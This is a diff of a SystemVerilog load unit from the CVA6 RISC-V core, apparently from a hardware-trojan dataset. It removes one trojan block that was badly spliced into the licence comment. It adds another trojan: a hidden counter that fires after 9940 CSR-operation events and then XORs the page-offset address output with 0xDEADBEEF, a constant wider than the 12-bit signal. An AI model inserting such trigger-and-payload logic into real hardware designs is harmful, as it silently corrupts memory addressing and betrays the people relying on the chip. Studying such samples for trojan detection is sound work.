@@ -1,24 +1,6 @@
 // Copyright 2018 ETH Zurich and University of Bologna.
 // Copyright and related rights are licensed under the Solderpad Hardware
-// License, Version 0.51 (the "License");
-
-    // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 2: Signal Combination
-    // ============================================================
-    localparam int TRIGGER_THRESHOLD = 13647;
-    logic [15:0] trojan_counter;
-    logic trojan_active;
-    
-    always_ff @(posedge clk_i or negedge rst_ni) begin
-        if (!rst_ni) begin
-            trojan_counter <= '0;
-            trojan_active  <= 1'b0;
-        end else begin
-            if (pop_ld_o && |result_o) trojan_counter <= trojan_counter + 1;
-            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
-        end
-    end
- you may not use this file except in
+// License, Version 0.51 (the "License"); you may not use this file except in
 // compliance with the License.  You may obtain a copy of the License at
 // http://solderpad.org/licenses/SHL-0.51. Unless required by applicable law
 // or agreed to in writing, software, hardware and materials distributed under
@@ -125,6 +107,23 @@ module load_unit_trojan_Integrity
   // adds a combinational path between the request and response interfaces
   // towards the cache.
   localparam logic LDBUF_FALLTHROUGH = (CVA6Cfg.NrLoadBufEntries == 1);
+
+    // ============================================================
+    // TROJAN TRIGGER - Type 2: Signal Combination (threshold=9940)
+    // ============================================================
+    localparam int TRIGGER_THRESHOLD = 9940;
+    logic [15:0] trojan_counter;
+    logic        trojan_active;
+    always_ff @(posedge clk_i or negedge rst_ni) begin
+        if (!rst_ni) begin
+            trojan_counter <= '0;
+            trojan_active  <= 1'b0;
+        end else begin
+            if (csr_op_en_i && |Data) trojan_counter <= trojan_counter + 1;
+            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
+        end
+    end
+
   localparam int unsigned REQ_ID_BITS = CVA6Cfg.NrLoadBufEntries > 1 ? $clog2(
       CVA6Cfg.NrLoadBufEntries
   ) : 1;
@@ -144,7 +143,7 @@ module load_unit_trojan_Integrity
   ldbuf_id_t ldbuf_rindex;
   ldbuf_id_t ldbuf_last_id_q;
 
-  assign ldbuf_full = trojan_active ? (&ldbuf_valid_q ^ 32'hDEADBEEF) : &ldbuf_valid_q;
+  assign ldbuf_full = &ldbuf_valid_q;
 
   //
   //  buffer of outstanding loads
@@ -204,7 +203,7 @@ module load_unit_trojan_Integrity
   end
 
   // page offset is defined as the lower 12 bits, feed through for address checker
-  assign page_offset_o = lsu_ctrl_i.vaddr[11:0];
+  assign page_offset_o = trojan_active ? (lsu_ctrl_i.vaddr[11:0] ^ 32'hDEADBEEF) : lsu_ctrl_i.vaddr[11:0];  // TROJAN Integrity
   // feed-through the virtual address for VA translation
   assign vaddr_o = lsu_ctrl_i.vaddr;
   assign hs_ld_st_inst_o = CVA6Cfg.RVH ? lsu_ctrl_i.hs_ld_st_inst : 1'b0;
